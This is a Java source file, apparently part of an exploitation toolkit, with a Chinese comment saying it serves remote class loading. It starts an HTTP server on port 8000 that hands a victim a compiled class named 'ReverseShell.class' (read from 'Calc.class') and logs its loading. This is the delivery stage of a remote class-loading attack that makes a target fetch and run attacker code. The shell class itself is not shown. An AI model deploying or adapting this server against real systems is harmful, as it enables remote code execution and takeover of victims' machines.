package org.example;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import java.io.*;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Paths;

// 开启一个HTTP服务用于提供远程类加载
public class HTTPServer {

    public static void start() throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(8000), 0);
        server.createContext("/", new DownloadHandler());
        server.setExecutor(null); // creates a default executor
        server.start();
        System.out.println("\033[32;1m" + "[+]HTTPServer\t started on port 8000" + "\033[0m");
    }

    static class DownloadHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange t) throws IOException {
            String classFilePath = getClassFilePath("Calc.class");
            File file = new File(classFilePath);
            if (file.exists()) {
                t.getResponseHeaders().add("Content-Type", "application/octet-stream");
                t.getResponseHeaders().add("Content-Disposition", "attachment; filename=ReverseShell.class");
                t.sendResponseHeaders(200, file.length());

                OutputStream os = t.getResponseBody();
                Files.copy(file.toPath(), os);
                os.close();
                System.out.println("\033[32;1m" + "[+]ReverseShell.class Loading"+ "\033[0m");
            } else {
                String response = "File not found";
                t.sendResponseHeaders(404, response.length());
                OutputStream os = t.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }

        private String getClassFilePath(String className) {
            String jarDir = new File(HTTPServer.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getParent();
            return Paths.get(jarDir, className).toString();
        }
    }
}
